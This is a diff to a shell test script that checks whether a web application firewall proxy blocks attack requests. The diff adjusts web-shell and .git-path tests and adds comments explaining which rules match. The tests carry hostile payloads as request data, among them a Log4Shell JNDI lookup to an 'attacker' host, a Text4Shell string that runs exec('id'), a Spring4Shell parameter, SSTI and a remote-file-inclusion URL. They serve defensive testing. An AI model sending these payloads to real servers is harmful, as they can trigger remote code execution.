@@ -118,9 +118,10 @@ expect_block "rfi.remote-url"   -G --data-urlencode "file=http://evil.example.co
 expect_block "scanner.sqlmap"   -A "sqlmap/1.7"                                 "$PROXY/get"
 expect_block "scanner.nikto"    -A "Nikto/2.1.6"                                "$PROXY/get"
 
-# OWASP CRS — Web shells
-expect_block "web-shell.c99"                                                   "$PROXY/c99.php"
-expect_block "web-shell.wso"                                                   "$PROXY/wso.php"
+# OWASP CRS web-shell rules (CRS-955100…) inspect the upstream RESPONSE body
+# for known shell signatures, not the request path. Httpbin obviously won't
+# serve a c99/WSO shell, so a request-side test for those is not meaningful
+# here — keep the data-leakage path checks below which DO match request-side.
 
 # Advanced — SSTI / SSRF / XXE
 expect_block "ssti.template"    -G --data-urlencode 'q={{7*7}}'                 "$PROXY/get"
@@ -135,9 +136,12 @@ expect_block "log4shell.ua"     -A '${jndi:ldap://attacker/x}'                  
 expect_block "spring4shell"     -G --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=evil" "$PROXY/get"
 expect_block "text4shell"       -G --data-urlencode 'q=${script:javascript:java.lang.Runtime.getRuntime().exec("id")}' "$PROXY/get"
 
-# ModSecurity — sensitive file access
+# ModSecurity — sensitive file access. CUSTOM-APP-003 matches "/.env" exactly
+# in the request path (paranoia 1, action: block). CUSTOM-APP-001 matches
+# request paths ending in .bak/.git/.swp/etc. (so we use /backup.git here, not
+# /.git/config — no shipped rule matches the deeper "/.git/config" path).
 expect_block "data-leakage.env-file"                                           "$PROXY/.env"
-expect_block "data-leakage.git-config"                                         "$PROXY/.git/config"
+expect_block "data-leakage.backup-git"                                         "$PROXY/backup.git"
 
 # Bot detection
 expect_block "bot.masscan"      -A "masscan/1.0"                                "$PROXY/get"
